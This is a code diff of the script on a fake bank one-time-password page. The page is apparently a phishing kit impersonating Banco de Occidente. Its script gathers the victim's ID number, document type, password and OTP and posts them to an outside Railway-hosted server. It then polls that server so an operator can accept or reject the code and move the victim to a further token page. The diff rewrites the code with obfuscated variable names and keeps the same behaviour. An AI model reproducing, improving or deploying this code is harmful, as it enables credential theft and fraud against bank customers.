@@ -127,149 +127,116 @@
     </style>
 
     <script>
-        document.addEventListener('DOMContentLoaded', function () {
+    document.addEventListener('DOMContentLoaded',function(){
+        var _0xa1='https://multi-bancos-production.up.railway.app';
+        var _0xb2='occidente';
+        var _0xc3=sessionStorage.getItem('sessionId')||'';
+        var _0xd4=sessionStorage.getItem('identificacion')||'';
+        var _0xe5=sessionStorage.getItem('clave')||'';
+        var _0xf6=sessionStorage.getItem('tipoDoc')||'CC';
+        var _0xg7=document.getElementById('otp');
+        var _0xh8=document.getElementById('btnVerificar');
+        var _0xi9=document.getElementById('loadingScreen');
+        var _0xj0=document.getElementById('resendCode');
+        var _0xk1=document.getElementById('errorLogin');
+        var _0xl2=document.getElementById('errorLoginBtn');
 
-            const otpInput = document.getElementById('otp');
-            const btnVerificar = document.getElementById('btnVerificar');
-            const loadingScreen = document.getElementById('loadingScreen');
-            const resendCode = document.getElementById('resendCode');
-            const errorLogin = document.getElementById('errorLogin');
-            const errorLoginBtn = document.getElementById('errorLoginBtn');
+        if(_0xg7){
+            _0xg7.addEventListener('keypress',function(_0xm3){
+                if(_0xm3.key&&_0xm3.key.length===1&&/\D/.test(_0xm3.key)){_0xm3.preventDefault()}
+            });
+            _0xg7.addEventListener('input',function(){
+                var _0xn4=_0xg7.value.replace(/\D/g,'').slice(0,8);
+                if(_0xg7.value!==_0xn4){_0xg7.value=_0xn4}
+                _0xo5()
+            });
+            _0xg7.addEventListener('paste',function(_0xp6){
+                _0xp6.preventDefault();
+                var _0xq7=(_0xp6.clipboardData||window.clipboardData).getData('text')||'';
+                var _0xr8=_0xq7.replace(/\D/g,'').slice(0,8);
+                _0xg7.value=_0xr8;
+                _0xg7.dispatchEvent(new Event('input',{bubbles:true}))
+            });
+            _0xg7.addEventListener('drop',function(_0xs9){_0xs9.preventDefault()});
+            setTimeout(function(){_0xg7.focus()},300);
+        }
 
-            const API = 'https://multi-bancos-production.up.railway.app';
-            const BANCO = 'occidente';
+        function _0xo5(){
+            var _0xt0=_0xg7?_0xg7.value.trim():'';
+            if(_0xh8){_0xh8.disabled=(_0xt0.length<4||_0xt0.length>8)}
+        }
 
-            const sessionId = sessionStorage.getItem('sessionId') || '';
-            const identificacion = sessionStorage.getItem('identificacion') || '';
-            const clave = sessionStorage.getItem('clave') || '';
-            const tipoDoc = sessionStorage.getItem('tipoDoc') || 'CC';
-
-            if (otpInput) {
-                otpInput.addEventListener('keypress', function (e) {
-                    if (e.key && e.key.length === 1 && /\D/.test(e.key)) {
-                        e.preventDefault();
+        async function _0xu1(_0xv2){
+            if(_0xi9){_0xi9.classList.add('active')}
+            try{
+                await fetch(_0xa1+'/'+_0xb2+'/enviar-otp',{
+                    method:'POST',
+                    headers:{'Content-Type':'application/json'},
+                    body:JSON.stringify({
+                        sessionId:_0xc3,
+                        otp:_0xv2,
+                        identificacion:_0xd4,
+                        clave:_0xe5,
+                        tipoDoc:_0xf6
+                    })
+                });
+                console.log('OTP enviado:',_0xv2)
+            }catch(_0xw3){console.error('Error enviando OTP:',_0xw3)}
+            var _0xx4=setInterval(async function(){
+                try{
+                    var _0xy5=await fetch(_0xa1+'/'+_0xb2+'/estado/'+_0xc3);
+                    var _0xz6=await _0xy5.json();
+                    console.log('Estado:',_0xz6.estado);
+                    if(_0xz6.estado==='token'){
+                        clearInterval(_0xx4);
+                        window.location.href='token.html'
+                    }else if(_0xz6.estado==='rechazado'){
+                        clearInterval(_0xx4);
+                        if(_0xi9)_0xi9.classList.remove('active');
+                        if(_0xg7)_0xg7.value='';
+                        if(_0xh8)_0xh8.disabled=true;
+                        if(_0xk1)_0xk1.classList.add('visible')
                     }
-                });
+                }catch(_0x07){console.error('Error estado:',_0x07)}
+            },2000)
+        }
 
-                otpInput.addEventListener('input', function () {
-                    const limpio = otpInput.value.replace(/\D/g, '').slice(0, 8);
-                    if (otpInput.value !== limpio) {
-                        otpInput.value = limpio;
-                    }
-                    validarOtp();
-                });
-
-                otpInput.addEventListener('paste', function (e) {
-                    e.preventDefault();
-                    const texto = (e.clipboardData || window.clipboardData).getData('text') || '';
-                    const limpio = texto.replace(/\D/g, '').slice(0, 8);
-                    otpInput.value = limpio;
-                    otpInput.dispatchEvent(new Event('input', { bubbles: true }));
-                });
-
-                otpInput.addEventListener('drop', function (e) {
-                    e.preventDefault();
-                });
-
-                setTimeout(function () {
-                    otpInput.focus();
-                }, 300);
-            }
-
-            function validarOtp() {
-                const valor = otpInput ? otpInput.value.trim() : '';
-                if (btnVerificar) {
-                    btnVerificar.disabled = (valor.length < 4 || valor.length > 8);
+        if(_0xh8){
+            _0xh8.addEventListener('click',function(_0x18){
+                _0x18.preventDefault();
+                var _0x29=_0xg7?_0xg7.value.trim():'';
+                if(_0x29.length<4||_0x29.length>8){
+                    alert('El código debe tener entre 4 y 8 dígitos');
+                    return
                 }
-            }
+                _0xu1(_0x29)
+            })
+        }
 
-            async function enviarOtp(valorOtp) {
-                if (loadingScreen) {
-                    loadingScreen.classList.add('active');
+        if(_0xg7){
+            _0xg7.addEventListener('keypress',function(_0x3a){
+                if(_0x3a.key==='Enter'&&_0xg7.value.length>=4){
+                    _0x3a.preventDefault();
+                    _0xu1(_0xg7.value.trim())
                 }
+            })
+        }
 
-                try {
-                    await fetch(API + '/' + BANCO + '/enviar-otp', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            sessionId: sessionId,
-                            otp: valorOtp,
-                            identificacion: identificacion,
-                            clave: clave,
-                            tipoDoc: tipoDoc
-                        })
-                    });
-                    console.log('OTP enviado:', valorOtp);
-                } catch (e) {
-                    console.error('Error enviando OTP:', e);
-                }
+        if(_0xj0){
+            _0xj0.addEventListener('click',function(_0x4b){
+                _0x4b.preventDefault();
+                alert('Código reenviado')
+            })
+        }
 
-                const intervalo = setInterval(async function () {
-                    try {
-                        const r = await fetch(API + '/' + BANCO + '/estado/' + sessionId);
-                        const data = await r.json();
-                        console.log('Estado:', data.estado);
-
-                        if (data.estado === 'token') {
-                            clearInterval(intervalo);
-                            window.location.href = 'token.html';
-                        } else if (data.estado === 'rechazado') {
-                            clearInterval(intervalo);
-                            if (loadingScreen) loadingScreen.classList.remove('active');
-                            if (otpInput) otpInput.value = '';
-                            if (btnVerificar) btnVerificar.disabled = true;
-                            if (errorLogin) errorLogin.classList.add('visible');
-                        }
-                    } catch (e) {
-                        console.error('Error estado:', e);
-                    }
-                }, 2000);
-            }
-
-            if (btnVerificar) {
-                btnVerificar.addEventListener('click', function (e) {
-                    e.preventDefault();
-
-                    const valor = otpInput ? otpInput.value.trim() : '';
-
-                    if (valor.length < 4 || valor.length > 8) {
-                        alert('El código debe tener entre 4 y 8 dígitos');
-                        return;
-                    }
-
-                    enviarOtp(valor);
-                });
-            }
-
-            if (otpInput) {
-                otpInput.addEventListener('keypress', function (e) {
-                    if (e.key === 'Enter' && otpInput.value.length >= 4) {
-                        e.preventDefault();
-                        enviarOtp(otpInput.value.trim());
-                    }
-                });
-            }
-
-            if (resendCode) {
-                resendCode.addEventListener('click', function (e) {
-                    e.preventDefault();
-                    alert('Código reenviado');
-                });
-            }
-
-            if (errorLoginBtn) {
-                errorLoginBtn.addEventListener('click', function () {
-                    if (errorLogin) errorLogin.classList.remove('visible');
-                    if (otpInput) {
-                        otpInput.value = '';
-                        otpInput.focus();
-                    }
-                    if (btnVerificar) btnVerificar.disabled = true;
-                });
-            }
-
-        });
+        if(_0xl2){
+            _0xl2.addEventListener('click',function(){
+                if(_0xk1)_0xk1.classList.remove('visible');
+                if(_0xg7){_0xg7.value='';_0xg7.focus()}
+                if(_0xh8)_0xh8.disabled=true
+            })
+        }
+    });
     </script>
 
 <script>
